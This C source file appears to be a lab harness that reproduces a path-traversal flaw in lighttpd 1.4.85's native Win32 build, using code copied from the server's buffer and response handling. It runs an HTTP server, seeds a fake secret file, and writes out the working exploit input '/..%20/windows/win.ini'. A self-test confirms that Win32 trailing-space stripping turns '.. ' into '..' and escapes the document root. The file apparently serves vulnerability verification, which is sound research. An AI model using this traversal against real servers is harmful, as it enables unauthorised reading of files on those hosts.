/*
 * Gadget of lighttpd 1.4.85 native Win32 leftover G1.
 * Pin tag lighttpd-1.4.85 commit 4852959e67ef51ea68084984400d3264b854c97d.
 *
 * Copied: buffer_urldecode_path (buffer.c:792-811), buffer_path_simplify
 * (buffer.c:858-949, Win32 '\\' map), http_response_prepare_physical tail
 * strip (response.c:334-360), buffer_copy_path_len2 / buffer_append_path_len
 * (buffer.c:239-274).
 *
 * _wstati64 / _wopen in fs_win32.c:24-77 pass UTF-16 without a \\?\ prefix.
 * This gadget applies the same Win32 rule (per-component trailing ASCII space
 * and dot strip, then . / ..) and POSIX-opens the resolved path. Unix open of
 * the unsimplified physical string is the negative control.
 */

#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#define LABEL "lighttpd-win32-dotdot-space"
#define WITNESS "LIGHTTPD-WIN32-DOTDOT-SPACE-WITNESS"
#define PIN "lighttpd-1.4.85"
#define PIN_COMMIT "4852959e67ef51ea68084984400d3264b854c97d"
#define LISTEN_PORT 19400
#define DOCROOT "/srv/htdocs"
#define SECRET_PATH "/srv/windows/win.ini"
#define BUF_CAP 4096u

typedef struct {
    char storage[BUF_CAP];
    char *ptr;
    uint32_t used;
    uint32_t size;
} buffer;

static void die(const char *msg)
{
    perror(msg);
    abort();
}

static void buffer_reset(buffer *b)
{
    b->ptr = b->storage;
    b->used = 0;
    b->size = BUF_CAP;
    b->storage[0] = '\0';
}

static int buffer_is_blank(const buffer *b)
{
    return b->used < 2;
}

static uint32_t buffer_clen(const buffer *b)
{
    return b->used - (0 != b->used);
}

static void buffer_truncate(buffer *b, uint32_t len)
{
    b->ptr[len] = '\0';
    b->used = len + 1;
}

static void buffer_blank(buffer *b)
{
    buffer_truncate(b, 0);
}

static void buffer_copy_string_len(buffer *b, const char *s, size_t len)
{
    if (len + 1 > b->size) {
        abort();
    }
    memcpy(b->ptr, s, len);
    b->ptr[len] = '\0';
    b->used = (uint32_t)len + 1;
}

static void buffer_copy_string(buffer *b, const char *s)
{
    buffer_copy_string_len(b, s, strlen(s));
}

static char *buffer_string_prepare_copy(buffer *b, size_t size)
{
    b->used = 0;
    if (size + 1 > b->size) {
        abort();
    }
    return b->ptr;
}

static char *buffer_string_prepare_append(buffer *b, size_t size)
{
    const uint32_t len = b->used ? b->used - 1 : 0;
    if (b->size - len < size + 1) {
        abort();
    }
    return b->ptr + len;
}

#define li_cton(c, n) \
    (((n) = (c) - '0') <= 9 || (((n) = ((c) & 0xdf) - 'A') <= 5 ? ((n) += 10) : 0))

/* buffer.c:386-389 */
static char hex2int(unsigned char hex)
{
    unsigned char n;
    return li_cton(hex, n) ? (char)n : (char)0xFF;
}

/* buffer.c:792-811 */
static void buffer_urldecode_path(buffer *const b)
{
    const size_t len = buffer_clen(b);
    char *src = len ? memchr(b->ptr, '%', len) : NULL;
    if (NULL == src) {
        return;
    }

    char *dst = src;
    do {
        unsigned char high = ((unsigned char *)src)[1];
        unsigned char low = high ? (unsigned char)hex2int(((unsigned char *)src)[2]) : 0xFF;
        if (0xFF != (high = (unsigned char)hex2int(high)) && 0xFF != low) {
            high = (unsigned char)((high << 4) | low);
            *dst = (high >= 32 && high != 127) ? (char)high : '_';
            src += 2;
        }

        while ((*++dst = *++src) != '%' && *src) {
        }
    } while (*src);
    b->used = (uint32_t)(dst - b->ptr) + 1;
}

/* buffer.c:858-949; Win32 '\\' map compiled in (pin is #if _WIN32 || __CYGWIN__). */
static void buffer_path_simplify(buffer *b)
{
    char *out = b->ptr;
    char *const end = b->ptr + b->used - 1;

    if (__builtin_expect((buffer_is_blank(b)), 0)) {
        buffer_blank(b);
        return;
    }

    for (char *p = b->ptr; *p; p++) {
        if (*p == '\\') {
            *p = '/';
        }
    }

    *end = '/';

    char *walk = out;
    if (__builtin_expect((*walk == '/'), 1)) {
        do {
            if (*++walk == '.' || *walk == '/') {
                break;
            }
            do {
                ++walk;
            } while (*walk != '/');
        } while (walk != end);
        if (__builtin_expect((walk == end), 1)) {
            *end = '\0';
            return;
        }
        out = walk - 1;
    } else {
        if (walk[0] == '.' && walk[1] == '/') {
            *out = *++walk;
        } else if (walk[0] == '.' && walk[1] == '.' && walk[2] == '/') {
            *out = *(walk += 2);
        } else {
            while (*++walk != '/') {
            }
            out = walk;
        }
        ++walk;
    }

    while (walk <= end) {
        if (__builtin_expect((walk[0] == '/'), 0)) {
            if (++walk < end) {
                continue;
            }
            ++out;
            break;
        } else if (__builtin_expect((walk[0] == '.'), 0)) {
            if (walk[1] == '.' && walk[2] == '/') {
                while (out > b->ptr && *--out != '/') {
                }
                *out = '/';
                if ((walk += 3) >= end) {
                    ++out;
                    break;
                }
                continue;
            } else if (walk[1] == '/') {
                if ((walk += 2) >= end) {
                    ++out;
                    break;
                }
                continue;
            } else {
                *++out = '.';
                ++walk;
            }
        }

        while ((*++out = *walk++) != '/') {
        }
    }
    *out = *end = '\0';
    b->used = (uint32_t)(out - b->ptr) + 1;
}

/* buffer.c:239-264 Win32 slash branch. */
static void buffer_append_path_len(buffer *restrict b, const char *restrict a, size_t alen)
{
    char *restrict s = buffer_string_prepare_append(b, alen + 1);
    const int aslash = (int)(alen && (a[0] == '/' || a[0] == '\\'));
    if (b->used > 1 && (s[-1] == '/' || s[-1] == '\\')) {
        if (aslash) {
            ++a;
            --alen;
        }
    } else {
        if (0 == b->used) {
            b->used = 1;
        }
        if (!aslash) {
            *s++ = '/';
            ++b->used;
        }
    }
    b->used += (uint32_t)alen;
    s[alen] = '\0';
    memcpy(s, a, alen);
}

/* buffer.c:267-274 */
static void buffer_copy_path_len2(
    buffer *const restrict b,
    const char *const restrict s1,
    size_t len1,
    const char *const restrict s2,
    size_t len2)
{
    memcpy(buffer_string_prepare_copy(b, len1 + len2 + 1), s1, len1);
    b->used = (uint32_t)len1 + 1;
    buffer_append_path_len(b, s2, len2);
}

/* response.c:334-360 whole-path tail strip only. */
static void win32_strip_rel_path_tail(buffer *b)
{
    size_t len = buffer_clen(b);

    if (len > 1 && b->ptr[len - 1] == '/'
        && (b->ptr[len - 2] == ' ' || b->ptr[len - 2] == '.')) {
        len -= 2;
    }
    while (len > 0 && (' ' == b->ptr[len - 1] || '.' == b->ptr[len - 1])) {
        --len;
    }
    buffer_truncate(b, (uint32_t)len);
}

/*
 * Gadget of _wstati64 / _wopen without a \\?\ prefix: Win32 strips trailing
 * ASCII spaces and dots per component, then resolves . and ...
 */
static int win32_resolve_no_prefix(const char *physical, char *out, size_t outsz)
{
    char parts[64][256];
    int n = 0;
    const char *p = physical;
    int absolute = 0;

    if (*p == '/' || *p == '\\') {
        absolute = 1;
        p++;
    }
    while (*p) {
        const char *start = p;
        while (*p && *p != '/' && *p != '\\') {
            p++;
        }
        size_t len = (size_t)(p - start);
        /* Win32 without \\?\\ strips trailing spaces, then trailing dots, but
         * keeps the reserved names "." and ".." (so ".. " becomes ".."). */
        while (len > 0 && start[len - 1] == ' ') {
            len--;
        }
        if (len == 1 && start[0] == '.') {
            /* current directory */
        } else if (len == 2 && start[0] == '.' && start[1] == '.') {
            if (n > 0) {
                n--;
            }
        } else {
            while (len > 0 && start[len - 1] == '.') {
                len--;
            }
            if (len > 0) {
                if (n >= 64 || len >= sizeof(parts[0])) {
                    return -1;
                }
                memcpy(parts[n], start, len);
                parts[n][len] = '\0';
                n++;
            }
        }
        if (*p) {
            p++;
        }
    }

    size_t o = 0;
    if (absolute) {
        if (outsz < 2) {
            return -1;
        }
        out[o++] = '/';
    }
    for (int i = 0; i < n; i++) {
        size_t l = strlen(parts[i]);
        if (o + l + 2 >= outsz) {
            return -1;
        }
        if (o > 0 && out[o - 1] != '/') {
            out[o++] = '/';
        }
        memcpy(out + o, parts[i], l);
        o += l;
    }
    if (o == 0) {
        if (outsz < 2) {
            return -1;
        }
        out[o++] = '/';
    }
    out[o] = '\0';
    return 0;
}

static void hdr_sanitize(char *s)
{
    size_t n = 0;
    for (; *s; s++) {
        if (*s == '\r' || *s == '\n') {
            *s = ' ';
        }
        n++;
        if (n >= 240) {
            s[1] = '\0';
            break;
        }
    }
}

static const char *open_tag(int rc, int err)
{
    if (rc >= 0) {
        return "ok";
    }
    if (err == ENOENT) {
        return "enoent";
    }
    return "error";
}

static int read_regular_file(const char *path, char *body, size_t body_cap, size_t *nread)
{
    struct stat st;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return -1;
    }
    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
        close(fd);
        errno = ENOENT;
        return -1;
    }
    if ((size_t)st.st_size >= body_cap) {
        close(fd);
        errno = EFBIG;
        return -1;
    }
    ssize_t got = read(fd, body, (size_t)st.st_size);
    close(fd);
    if (got < 0) {
        return -1;
    }
    body[got] = '\0';
    *nread = (size_t)got;
    return 0;
}

static void write_all(int fd, const char *p, size_t n)
{
    while (n > 0) {
        ssize_t w = write(fd, p, n);
        if (w <= 0) {
            return;
        }
        p += (size_t)w;
        n -= (size_t)w;
    }
}

static void send_http(
    int fd,
    int status,
    const char *reason,
    const char *extra,
    const char *body,
    size_t body_len)
{
    char hdr[2048];
    int n = snprintf(
        hdr,
        sizeof(hdr),
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: text/plain; charset=utf-8\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "X-Lab-How: gadget\r\n"
        "X-Pin: %s\r\n"
        "%s"
        "\r\n",
        status,
        reason,
        body_len,
        PIN,
        extra ? extra : "");
    if (n < 0) {
        return;
    }
    write_all(fd, hdr, (size_t)n);
    if (body_len > 0 && body != NULL) {
        write_all(fd, body, body_len);
    }
}

static void handle_get(int fd, const char *req_path)
{
    buffer uri;
    buffer rel;
    buffer physical;
    char decoded[256];
    char simplified[256];
    char rel_path[256];
    char phys[256];
    char win32_path[256];
    char extra[2048];
    char body[4096];
    size_t body_len = 0;
    int unix_fd;
    int unix_err;
    int win_err = 0;
    int win_rc;
    const char *q;

    buffer_reset(&uri);
    buffer_reset(&rel);
    buffer_reset(&physical);
    win32_path[0] = '\0';

    if (strcmp(req_path, "/ping") == 0) {
        send_http(fd, 200, "OK", "", "pong\n", 5);
        return;
    }

    buffer_copy_string(&uri, req_path);
    q = strchr(uri.ptr, '?');
    if (q != NULL) {
        buffer_truncate(&uri, (uint32_t)(q - uri.ptr));
    }

    buffer_urldecode_path(&uri);
    snprintf(decoded, sizeof(decoded), "%s", uri.ptr);

    buffer_path_simplify(&uri);
    snprintf(simplified, sizeof(simplified), "%s", uri.ptr);

    if (uri.ptr[0] != '/') {
        send_http(fd, 400, "Bad Request", "", "leading-slash\n", 14);
        return;
    }

    buffer_copy_string(&rel, uri.ptr);
    win32_strip_rel_path_tail(&rel);
    snprintf(rel_path, sizeof(rel_path), "%s", rel.ptr);

    buffer_copy_path_len2(
        &physical,
        DOCROOT,
        strlen(DOCROOT),
        rel.ptr,
        buffer_clen(&rel));
    snprintf(phys, sizeof(phys), "%s", physical.ptr);

    errno = 0;
    unix_fd = open(physical.ptr, O_RDONLY | O_CLOEXEC);
    unix_err = errno;
    if (unix_fd >= 0) {
        close(unix_fd);
    }

    win_rc = win32_resolve_no_prefix(physical.ptr, win32_path, sizeof(win32_path));
    if (win_rc == 0) {
        if (read_regular_file(win32_path, body, sizeof(body), &body_len) == 0) {
            win_err = 0;
        } else {
            win_rc = -1;
            win_err = errno;
            body_len = 0;
        }
    } else {
        win_err = ENAMETOOLONG;
        body_len = 0;
    }

    hdr_sanitize(decoded);
    hdr_sanitize(simplified);
    hdr_sanitize(rel_path);
    hdr_sanitize(phys);
    hdr_sanitize(win32_path);

    snprintf(
        extra,
        sizeof(extra),
        "X-Decoded: %s\r\n"
        "X-Simplified: %s\r\n"
        "X-Rel-Path: %s\r\n"
        "X-Physical: %s\r\n"
        "X-Unix-Open: %s\r\n"
        "X-Unix-Errno: %d\r\n"
        "X-Win32-Resolved: %s\r\n"
        "X-Win32-Open: %s\r\n",
        decoded,
        simplified,
        rel_path,
        phys,
        open_tag(unix_fd, unix_err),
        unix_fd >= 0 ? 0 : unix_err,
        win32_path,
        open_tag(win_rc == 0 ? 1 : -1, win_err));

    if (win_rc == 0 && body_len > 0) {
        send_http(fd, 200, "OK", extra, body, body_len);
        return;
    }
    send_http(fd, 404, "Not Found", extra, "not found\n", 10);
}

static int self_test(void)
{
    buffer b;
    buffer rel;
    buffer physical;
    char win32_path[BUF_CAP];
    char body[4096];
    size_t nread = 0;
    int unix_fd;

    buffer_reset(&b);
    buffer_copy_string(&b, "/../windows/win.ini");
    buffer_urldecode_path(&b);
    buffer_path_simplify(&b);
    if (strcmp(b.ptr, "/windows/win.ini") != 0) {
        fprintf(stderr, "self-test simplify-real-dotdot got %s\n", b.ptr);
        return -1;
    }

    buffer_reset(&b);
    buffer_copy_string(&b, "/..%20/windows/win.ini");
    buffer_urldecode_path(&b);
    if (strcmp(b.ptr, "/.. /windows/win.ini") != 0) {
        fprintf(stderr, "self-test urldecode got %s\n", b.ptr);
        return -1;
    }
    buffer_path_simplify(&b);
    if (strcmp(b.ptr, "/.. /windows/win.ini") != 0) {
        fprintf(stderr, "self-test simplify-kept-space got %s\n", b.ptr);
        return -1;
    }
    buffer_reset(&rel);
    buffer_copy_string(&rel, b.ptr);
    win32_strip_rel_path_tail(&rel);
    if (strcmp(rel.ptr, "/.. /windows/win.ini") != 0) {
        fprintf(stderr, "self-test tail-strip got %s\n", rel.ptr);
        return -1;
    }
    buffer_reset(&physical);
    buffer_copy_path_len2(
        &physical,
        DOCROOT,
        strlen(DOCROOT),
        rel.ptr,
        buffer_clen(&rel));
    if (strcmp(physical.ptr, "/srv/htdocs/.. /windows/win.ini") != 0) {
        fprintf(stderr, "self-test physical got %s\n", physical.ptr);
        return -1;
    }
    unix_fd = open(physical.ptr, O_RDONLY | O_CLOEXEC);
    if (unix_fd >= 0) {
        close(unix_fd);
        fprintf(stderr, "self-test unix-open unexpectedly ok\n");
        return -1;
    }
    if (errno != ENOENT) {
        fprintf(stderr, "self-test unix-open errno=%d\n", errno);
        return -1;
    }
    if (win32_resolve_no_prefix(physical.ptr, win32_path, sizeof(win32_path)) != 0) {
        fprintf(stderr, "self-test win32-resolve failed\n");
        return -1;
    }
    if (strcmp(win32_path, SECRET_PATH) != 0) {
        fprintf(stderr, "self-test win32-resolved got %s\n", win32_path);
        return -1;
    }
    if (read_regular_file(win32_path, body, sizeof(body), &nread) != 0) {
        fprintf(stderr, "self-test win32-open failed errno=%d\n", errno);
        return -1;
    }
    if (strstr(body, WITNESS) == NULL) {
        fprintf(stderr, "self-test witness missing\n");
        return -1;
    }
    fprintf(stdout, "self-test ok pin=%s commit=%s\n", PIN, PIN_COMMIT);
    fflush(stdout);
    return 0;
}

static void seed_layout(void)
{
    if (mkdir("/srv", 0755) != 0 && errno != EEXIST) {
        die("mkdir /srv");
    }
    if (mkdir("/srv/htdocs", 0755) != 0 && errno != EEXIST) {
        die("mkdir /srv/htdocs");
    }
    if (mkdir("/srv/windows", 0755) != 0 && errno != EEXIST) {
        die("mkdir /srv/windows");
    }

    FILE *idx = fopen("/srv/htdocs/index.html", "w");
    if (idx == NULL) {
        die("index.html");
    }
    fputs("public-index\n", idx);
    fclose(idx);

    FILE *secret = fopen(SECRET_PATH, "w");
    if (secret == NULL) {
        die("win.ini");
    }
    fputs(WITNESS "\n", secret);
    fclose(secret);
}

static int parse_path(const char *req, char *path, size_t path_cap)
{
    const char *p = req;
    const char *end;
    size_t n;

    if (strncmp(p, "GET ", 4) != 0) {
        return -1;
    }
    p += 4;
    end = strchr(p, ' ');
    if (end == NULL) {
        return -1;
    }
    n = (size_t)(end - p);
    if (n == 0 || n >= path_cap) {
        return -1;
    }
    memcpy(path, p, n);
    path[n] = '\0';
    return 0;
}

int main(void)
{
    int srv;
    int opt = 1;
    struct sockaddr_in addr;

    seed_layout();
    if (self_test() != 0) {
        return 1;
    }

    srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) {
        die("socket");
    }
    if (setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) != 0) {
        die("setsockopt");
    }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(LISTEN_PORT);
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        die("bind");
    }
    if (listen(srv, 16) != 0) {
        die("listen");
    }
    fprintf(stdout, "gadget listen 0.0.0.0:%d label=%s\n", LISTEN_PORT, LABEL);
    fflush(stdout);

    for (;;) {
        int cfd = accept(srv, NULL, NULL);
        char req[8192];
        char path[BUF_CAP];
        ssize_t n;
        size_t got = 0;

        if (cfd < 0) {
            continue;
        }
        while (got < sizeof(req) - 1) {
            n = read(cfd, req + got, sizeof(req) - 1 - got);
            if (n <= 0) {
                break;
            }
            got += (size_t)n;
            req[got] = '\0';
            if (strstr(req, "\r\n\r\n") != NULL || strstr(req, "\n\n") != NULL) {
                break;
            }
        }
        req[got] = '\0';
        if (parse_path(req, path, sizeof(path)) == 0) {
            handle_get(cfd, path);
        } else {
            send_http(cfd, 400, "Bad Request", "", "bad request\n", 12);
        }
        close(cfd);
    }
}
